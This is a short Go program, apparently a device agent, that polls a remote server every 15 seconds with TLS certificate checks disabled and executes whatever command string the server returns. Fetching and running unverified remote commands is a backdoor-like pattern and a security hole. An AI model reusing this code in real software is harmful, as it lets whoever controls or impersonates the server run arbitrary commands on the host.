package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"crypto/tls"
	"time"
)

func main() {
t := time.NewTicker(15 * time.Second)
// or just use the usual for { select {} } idiom of receiving from a channel
for now := range t.C {

	tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr}
    
	res, err := client.Get("https://li804-102.members.linode.com/fgtcfg/lib/agent.php?action=device/routine/get&devId=123")
	if err != nil {
		log.Fatal(err)
	}
	robots, err := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if err != nil {
		log.Fatal(err)
	}
	

	fmt.Printf("script to run is : %s", robots)
	x := string(robots)
	out, err := exec.Command(x).Output()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf("output is %s\n", out)
    fmt.Printf("sleeping the routine at %s\n", now)


}


   




    //cmd := exec.Command("/bin/sh", mongoToCsvSH)

}